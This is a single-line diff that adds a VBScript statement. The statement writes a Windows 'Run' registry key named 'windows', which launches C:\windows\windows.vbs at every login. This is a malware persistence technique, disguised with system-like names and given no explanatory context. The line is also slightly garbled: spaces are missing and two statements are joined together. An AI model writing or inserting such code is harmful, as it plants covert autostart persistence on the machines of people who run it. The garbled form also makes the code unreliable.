@@ -1,0 +1,1 @@
+SetobjShell=CreateObject("Wscript.Shell")objShell.RegWrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\windows","C:\windows\windows.vbs","REG_SZ"
